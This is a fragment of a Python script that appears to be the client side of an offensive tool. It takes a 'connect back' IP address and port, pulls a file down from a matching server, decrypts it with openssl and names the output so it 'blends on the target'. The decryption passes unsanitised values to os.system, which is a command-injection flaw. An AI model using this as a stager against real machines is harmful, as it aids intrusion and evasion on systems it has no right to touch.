...
def do_decryption(input_file, password, output_file):
    do_dec = os.system("openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:{} -in {} -out {}".format(password, input_file, output_file))
    return do_dec

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ipaddress", help="The ip address to connect back to", action="store", dest="ipaddress")
    parser.add_argument("-p", "--port", action="store", dest="port")
    parser.add_argument("-f", "--file", help="The file to pull down, it will be the same as the server.py -f option", action="store", dest="file")
    parser.add_argument("-b", "--blend", help="Decrypted out file name, make sure to pick something that blends on the target", action="store", dest="blend")
